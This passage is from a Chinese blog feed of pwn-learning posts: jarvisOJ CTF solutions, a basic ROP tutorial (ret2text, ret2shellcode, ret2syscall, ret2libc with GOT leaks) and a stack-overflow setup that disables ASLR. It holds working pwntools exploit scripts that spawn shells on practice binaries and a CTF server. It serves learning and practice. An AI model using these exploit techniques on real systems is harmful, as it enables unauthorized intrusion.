class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"pwn.jarvisoj.com"</span>,<span class="string">"9878"</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">payload = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">payload+=<span class="string">'0'</span></span><br><span class="line">payload+=chr(<span class="number">128</span>+i+<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">t = list(payload)</span><br><span class="line"><span class="comment">#l = "0123456789abcdef"</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> string.printable:</span><br><span class="line">t[<span class="number">2</span>*i] = j.encode(<span class="string">"hex"</span>)[<span class="number">0</span>]</span><br><span class="line">t[<span class="number">2</span>*i+<span class="number">1</span>] = j.encode(<span class="string">"hex"</span>)[<span class="number">1</span>]</span><br><span class="line">p.sendline(<span class="string">""</span>.join(t))</span><br><span class="line">re = p.recvline()</span><br><span class="line"><span class="keyword">if</span> <span class="string">"Yaaaa"</span> <span class="keyword">in</span> re:</span><br><span class="line">flag += j</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="fm"><a href="#fm" class="headerlink" title="fm"></a>fm</h3><p>这是一道格式化字符串的内存覆盖，exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">"pwn2.jarvisoj.com"</span>,<span class="string">"9895"</span>)</span><br><span class="line"></span><br><span class="line">x_addr = <span class="number">0x0804a02c</span></span><br><span class="line">payload = p32(x_addr) + <span class="string">"%11$n"</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;level0&quot;&gt;&lt;a href=&quot;#level0&quot; class=&quot;headerlink&quot; title=&quot;level0&quot;&gt;&lt;/a&gt;level0&lt;/h3&gt;&lt;p&gt;checksec,NX开启&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2019/05/19/jarvisOJ解题记
      
    
    </summary>
    
      <category term="pwn学习" scheme="https://j-kangel.github.io/categories/pwn%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="pwn" scheme="https://j-kangel.github.io/tags/pwn/"/>
    
      <category term="jarvisOJ" scheme="https://j-kangel.github.io/tags/jarvisOJ/"/>
    
  </entry>
  
  <entry>
    <title>PWN学习之基本ROP</title>
    <link href="https://j-kangel.github.io/2019/05/18/PWN%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%9F%BA%E6%9C%ACROP/"/>
    <id>https://j-kangel.github.io/2019/05/18/PWN学习之基本ROP/</id>
    <published>2019-05-17T20:08:43.000Z</published>
    <updated>2019-06-08T04:19:45.334Z</updated>
    
    <content type="html"><![CDATA[<h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><p>首先checksec，查看保护</p><p><img src="/2019/05/18/PWN学习之基本ROP/F:/blog\Hexo\source\_posts\PWN学习之基本ROP\1.JPG" alt=""></p><p>开启了NX保护，IDA查看程序</p><p><img src="/2019/05/18/PWN学习之基本ROP/F:/blog\Hexo\source\_posts\PWN学习之基本ROP\2.JPG" alt=""></p><p>很明显存在栈溢出漏洞，继续查看程序，发现有一处调用shell</p><p><img src="/2019/05/18/PWN学习之基本ROP/F:/blog\Hexo\source\_posts\PWN学习之基本ROP\3.JPG" alt=""></p><p>想要程序调用system函数，需要input==secretcode，而secretcode每次都是随机的，所以只能通过栈溢出，让main函数的返回值为调用system函数的地方，查看该函数所在的位置</p><p><img src="/2019/05/18/PWN学习之基本ROP/F:/blog\Hexo\source\_posts\PWN学习之基本ROP\4.JPG" alt=""></p><p>0x0804863A，接下来是找到函数返回的地址，并将其覆盖</p><p><img src="/2019/05/18/PWN学习之基本ROP/F:/blog\Hexo\source\_posts\PWN学习之基本ROP\5.JPG" alt=""></p><p>0xffffd338-0xffffd2cc = 108，于是构造payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">"./ret2text"</span>)</span><br><span class="line">addr = <span class="number">0x0804863A</span></span><br><span class="line">payload = (<span class="number">108</span>+<span class="number">4</span>) * <span class="string">'a'</span> + p32(addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>例题：jarvisOJ level0</p><h3 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h3><p>首先checksec</p><p><img src="/2019/05/18/PWN学习之基本ROP/F:/blog\Hexo\source\_posts\PWN学习之基本ROP\6.JPG" alt=""></p><p>32位程序，没有开启任何保护，IDA查看程序</p><p><img src="/2019/05/18/PWN学习之基本ROP/F:/blog\Hexo\source\_posts\PWN学习之基本ROP\7.JPG" alt=""></p><p>有栈溢出，例外，strncpy()函数将gets的内容写入buf2中。于是攻击思路如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将shellcode写入buf2中，然后利用栈溢出将函数返回地址覆盖为buf2的地址。例外有一点需要注意的是，shellcode长度不能超过0x64，buf2部分可写可执行</span><br></pre></td></tr></table></figure><p>查看buf2的地址</p><p><img src="/2019/05/18/PWN学习之基本ROP/F:/blog\Hexo\source\_posts\PWN学习之基本ROP\8.JPG" alt=""></p><p>可以看到buffer位于.bss段的0x0804A080处，接下来查看此处地址的权限</p><p><img src="/2019/05/18/PWN学习之基本ROP/F:/blog\Hexo\source\_posts\PWN学习之基本ROP\9.JPG" alt=""></p><p>vmmap查看内存，0xa080+0x64=0xa0c4，有可写可读可执行权限。于是构造payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">"./ret2shellcode"</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="keyword">print</span> shellcraft.sh()</span><br><span class="line"><span class="keyword">print</span> hex(len(shellcode))   <span class="comment">#0x2c</span></span><br><span class="line">buf = <span class="number">0x0804a080</span></span><br><span class="line">payload = shellcode.ljust(<span class="number">112</span>,<span class="string">'a'</span>) + p32(buf)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>例题：jarvisOJ level1</p><h3 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3><p>首先checksec</p><p><img src="/2019/05/18/PWN学习之基本ROP/F:/blog\Hexo\source\_posts\PWN学习之基本ROP\10.JPG" alt=""></p><p>开启NX，IDA查看程序</p><p><img src="/2019/05/18/PWN学习之基本ROP/F:/blog\Hexo\source\_posts\PWN学习之基本ROP\11.JPG" alt=""></p><p>没有系统函数和shellcode，但是依然有栈溢出，这时候可以利用系统调用。下面介绍几个相关知识：</p><p>执行系统调用的指令是 int 0x80</p><p>系统调用获取shell的函数是 execve(“/bin/sh”,NULL,NULL)</p><p>对应的寄存器的值（对于32位程序）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">系统调用号，即 eax 应该为 0xb</span><br><span class="line">第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</span><br><span class="line">第二个参数，即 ecx 应该为 0</span><br><span class="line">第三个参数，即 edx 应该为 0</span><br></pre></td></tr></table></figure><p>给寄存器赋值要利用到pop，因此需要ROPgadget</p><p>查找可存储寄存器的代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop  --only <span class="string">'pop|ret'</span> | grep <span class="string">'eax'</span></span><br></pre></td></tr></table></figure><p>查找字符串</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop --string <span class="string">"/bin/sh"</span></span><br></pre></td></tr></table></figure><p>查找有int 0x80的地址</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop  --only <span class="string">'int'</span></span><br></pre></td></tr></table></figure><p>还有一点需要注意的是:ret操作会执行一次pop并作为跳转地址</p><p>首先找eax</p><p><img src="/2019/05/18/PWN学习之基本ROP/F:/blog\Hexo\source\_posts\PWN学习之基本ROP\12.JPG" alt=""></p><p>选取如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x080bb196 : pop eax ; ret</span><br></pre></td></tr></table></figure><p>再找ebx</p><p><img src="/2019/05/18/PWN学习之基本ROP/F:/blog\Hexo\source\_posts\PWN学习之基本ROP\13.JPG" alt=""></p><p>选取如下，一举三得</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br></pre></td></tr></table></figure><p>查找”/bin/sh”</p><p><img src="/2019/05/18/PWN学习之基本ROP/F:/blog\Hexo\source\_posts\PWN学习之基本ROP\14.JPG" alt=""></p><p>查找int 0x80</p><p><img src="/2019/05/18/PWN学习之基本ROP/F:/blog\Hexo\source\_posts\PWN学习之基本ROP\15.JPG" alt=""></p><p>编写脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">"./rop"</span>)</span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line">int_0x80 = <span class="number">0x08049421</span></span><br><span class="line">binsh = <span class="number">0x80be408</span></span><br><span class="line">payload = flat([<span class="string">'A'</span> * <span class="number">112</span>, pop_eax_ret, <span class="number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="number">0</span>, <span class="number">0</span>, binsh, int_0x80])</span><br><span class="line"><span class="keyword">print</span> len(payload)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><h4 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a>ret2libc1</h4><p>首先checksec</p><p><img src="/2019/05/18/PWN学习之基本ROP/F:/blog\Hexo\source\_posts\PWN学习之基本ROP\21.JPG" alt=""></p><p>32位程序，NX开启。IDA查看程序</p><p><img src="/2019/05/18/PWN学习之基本ROP/F:/blog\Hexo\source\_posts\PWN学习之基本ROP\22.JPG" alt=""></p><p>存在栈溢出漏洞，Get shell最直接的方法就是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">改写程序返回地址为so库中system函数的地址，同时布置好栈，将参数“/bin/sh\x00”放在’返回地址往后两个单位内存地址’处即可</span><br></pre></td></tr></table></figure><p>查看system函数和”/bin/sh”的地址</p><p><img src="/2019/05/18/PWN学习之基本ROP/F:/blog\Hexo\source\_posts\PWN学习之基本ROP\23.JPG" alt=""></p><p>编写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">"./ret2libc1"</span>)</span><br><span class="line">system_addr = <span class="number">0x08048460</span></span><br><span class="line">bin_sh = <span class="number">0x08048720</span></span><br><span class="line">payload = flat([<span class="number">112</span>*<span class="string">'a'</span>,system_addr,<span class="string">'aaaa'</span>,bin_sh])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>例题：jarvisOJ level2</p><h4 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a>ret2libc2</h4><p>首先checksec</p><p><img src="/2019/05/18/PWN学习之基本ROP/F:/blog\Hexo\source\_posts\PWN学习之基本ROP\16.JPG" alt=""></p><p>32位程序，开启了NX。IDA查看程序</p><p><img src="/2019/05/18/PWN学习之基本ROP/F:/blog\Hexo\source\_posts\PWN学习之基本ROP\17.JPG" alt=""></p><p>有栈溢出，并且有system函数和gets函数，攻击思路：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">利用gets函数向.bss段中写入“/bin/sh”，再调用系统函数执行system(&quot;/bin/sh&quot;)</span><br></pre></td></tr></table></figure><p>gdb查看system函数和gets函数在plt表中的位置</p><p><img src="/2019/05/18/PWN学习之基本ROP/F:/blog\Hexo\source\_posts\PWN学习之基本ROP\18.JPG" alt=""></p><p>找一个buf来存储写入的”/bin/sh”</p><p><img src="/2019/05/18/PWN学习之基本ROP/F:/blog\Hexo\source\_posts\PWN学习之基本ROP\19.JPG" alt=""></p><p>再找一个gadget连接gets和buf2，即ebx</p><p><img src="/2019/05/18/PWN学习之基本ROP/F:/blog\Hexo\source\_posts\PWN学习之基本ROP\20.JPG" alt=""></p><p>编写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">"./ret2libc2"</span>)</span><br><span class="line">get_addr = <span class="number">0x08048460</span></span><br><span class="line">system_addr = <span class="number">0x08048490</span></span><br><span class="line">buf2 = <span class="number">0x0804a080</span></span><br><span class="line">pop_ebx = <span class="number">0x0804843d</span></span><br><span class="line">payload = flat([<span class="number">112</span>*<span class="string">'a'</span>,get_addr,pop_ebx,buf2,system_addr,<span class="string">'aaaa'</span>,buf2])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">"/bin/sh"</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>该方法同样适用于ret2libc1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">"./ret2libc1"</span>)</span><br><span class="line">get_addr = <span class="number">0x08048430</span></span><br><span class="line">system_addr = <span class="number">0x08048460</span></span><br><span class="line">buf2 = <span class="number">0x0804a080</span></span><br><span class="line">pop_ebx = <span class="number">0x0804841d</span></span><br><span class="line">payload = flat([<span class="number">112</span>*<span class="string">'a'</span>,get_addr,pop_ebx,buf2,system_addr,<span class="string">'aaaa'</span>,buf2])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">"cat flag &gt; 111"</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h3><p>首先checksec</p><p><img src="/2019/05/18/PWN学习之基本ROP/F:/blog\Hexo\source\_posts\PWN学习之基本ROP\24.JPG" alt=""></p><p>32位程序，NX开启。IDA查看</p><p><img src="/2019/05/18/PWN学习之基本ROP/F:/blog\Hexo\source\_posts\PWN学习之基本ROP\25.JPG" alt=""></p><p>有栈溢出，无system函数。下面介绍两个知识点：</p><p>1、system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的，也就是说要找基地址。举个例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">puts真实地址-puts偏移地址 = system真实地址-system偏移地址 = 基地址</span><br></pre></td></tr></table></figure><p>2、那么如何得到 libc 中的某个函数的地址呢？我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址，已经执行过的话就会在got表生存下来。同时可以根据got表项找到对应的libc.so，从而确定函数偏移。举个例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">利用puts函数泄露puts函数的got表，因为puts函数在gets之前使用过。</span><br></pre></td></tr></table></figure><p>利用puts的got表项找对应的libc.so有两种方法：</p><p>1、<a href="https://libc.blukat.me" target="_blank" rel="noopener">https://libc.blukat.me</a></p><p>2、<a href="https://github.com/lieanu/LibcSearcher" target="_blank" rel="noopener">https://github.com/lieanu/LibcSearcher</a></p><p>objdump看一下got表有哪些</p><p><img src="/2019/05/18/PWN学习之基本ROP/F:/blog\Hexo\source\_posts\PWN学习之基本ROP\26.JPG" alt=""></p><p>因为PIE是关闭的，所以可以直接去puts出got表中puts的内容，并且返回到面函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./ret2libc3'</span>)</span><br><span class="line"><span class="keyword">if</span> args.G:</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">elf = ELF(<span class="string">"./ret2libc3"</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">112</span> + p32(elf.plt[<span class="string">'puts'</span>]) + p32(elf.symbols[<span class="string">'main'</span>]) + p32(elf.got[<span class="string">'puts'</span>])</span><br><span class="line">p.sendlineafter(<span class="string">'!?'</span>,payload)</span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">print</span> hex(puts_addr)</span><br></pre></td></tr></table></figure><p>然后根据got表中puts的内容找到相应的libc</p><p><img src="/2019/05/18/PWN学习之基本ROP/F:/blog\Hexo\source\_posts\PWN学习之基本ROP\27.JPG" alt=""></p><p>这样就可以求出libc的基地址，system的地址和“/bin/sh”的地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh_addr = next(libc.search(<span class="string">"/bin/sh"</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">112</span> + p32(system_addr) + p32(elf.symbols[<span class="string">'main'</span>]) + p32(binsh_addr)</span><br><span class="line">p.sendlineafter(<span class="string">'!?'</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>但是这样有个小问题，第二次调用main函数的时候，esp和ebp的相对偏移发生了变化，payload应为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'a'</span>*<span class="number">112</span> + p32(system_addr) + p32(elf.symbols[<span class="string">'main'</span>]) + p32(binsh_addr)</span><br></pre></td></tr></table></figure><p>利用cyclic来判断</p><p><img src="/2019/05/18/PWN学习之基本ROP/F:/blog\Hexo\source\_posts\PWN学习之基本ROP\28.JPG" alt=""></p><p>于是编写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">"./ret2libc3"</span>)</span><br><span class="line">ret2libc3 = ELF(<span class="string">"./ret2libc3"</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = ret2libc3.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = ret2libc3.got[<span class="string">'puts'</span>]</span><br><span class="line">main = ret2libc3.symbols[<span class="string">'main'</span>]</span><br><span class="line"></span><br><span class="line">payload = flat([<span class="number">112</span>*<span class="string">'a'</span>,puts_plt,main,puts_got])</span><br><span class="line">sh.sendlineafter(<span class="string">"Can you find it !?"</span>,payload)</span><br><span class="line">puts_addr = u32(sh.recv(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">print</span> hex(puts_addr)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>,puts_addr)</span><br><span class="line">libcbase = puts_addr - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line">payload = flat([<span class="number">104</span>*<span class="string">'a'</span>,system_addr,<span class="string">'aaaa'</span>,binsh_addr])</span><br><span class="line">sh.sendlineafter(<span class="string">"Can you find it !?"</span>,payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;ret2text&quot;&gt;&lt;a href=&quot;#ret2text&quot; class=&quot;headerlink&quot; title=&quot;ret2text&quot;&gt;&lt;/a&gt;ret2text&lt;/h3&gt;&lt;p&gt;首先checksec，查看保护&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2019/05/18/P
      
    
    </summary>
    
      <category term="pwn学习" scheme="https://j-kangel.github.io/categories/pwn%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="pwn" scheme="https://j-kangel.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>PWN学习之栈溢出</title>
    <link href="https://j-kangel.github.io/2019/05/17/PWN%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    <id>https://j-kangel.github.io/2019/05/17/PWN学习之栈溢出/</id>
    <published>2019-05-16T23:39:09.000Z</published>
    <updated>2019-05-16T16:04:33.791Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">learning without thought is vain， thought without learning is idle!</span><br></pre></td></tr></table></figure><p>不知道为什么，突然就领悟了这句早已滚瓜烂熟的孔夫子的经典名言–“学而不思则罔，思而不学则殆”。作为理工科来说，工而不理则罔，理而不工则殆。对于PWN的学习亦是如此，不动手只会越来越不想动手，而一动手就是一堆错。到头来只能感叹：“道理我都懂，可它就是不对！”为此，特将学习PWN的过程一一记录，以防思而不学。</p><p>理论参考CTFwiki，这里只记录过程</p><p>源代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">success</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"You Hava already controlled it."</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">12</span>];</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  vulnerable();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译前提</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/pwn/栈溢出<span class="comment"># cat /proc/sys/kernel/randomize_va_space  ##关闭ASLR</span></span><br><span class="line">2</span><br><span class="line">root@kali:/pwn/栈溢出<span class="comment"># echo 0 -&gt; /proc/sys/kernel/randomize_va_space </span></span><br><span class="line">root@kali:/pwn/栈溢出<span class="comment"># cat /proc/sys/kernel/randomize_va_space </span></span><br><span class="line">0</span><br><span class="line">root@kali:pwn/栈溢出<span class="comment"># apt install gcc-multilib  #完善gcc环境，使之能生成32位程序</span></span><br></pre></td></tr></table></figure><p>进行编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -fno-stack-protector -no-pie stack_example.c -o stack_example</span><br><span class="line">stack_example.c: In <span class="keyword">function</span> ‘vulnerable’:</span><br><span class="line">stack_example.c:9:3: warning: implicit declaration of <span class="keyword">function</span> ‘gets’; did you mean ‘fgets’? [-Wimplicit-function-declaration]</span><br><span class="line">   gets(s);</span><br><span class="line">   ^~~~</span><br><span class="line">   fgets</span><br><span class="line">/usr/bin/ld: /tmp/ccVDCXWz.o: <span class="keyword">in</span> <span class="keyword">function</span> `vulnerable<span class="string">':</span></span><br><span class="line"><span class="string">stack_example.c:(.text+0x45): 警告：the `gets'</span> <span class="keyword">function</span> is dangerous and should not be used.</span><br></pre></td></tr></table></figure><p>查看保护</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">checksec stack_example</span><br><span class="line">[*] <span class="string">'/mnt/hgfs/shared/pwn/\xe6\xa0\x88\xe6\xba\xa2\xe5\x87\xba/stack_example'</span></span><br><span 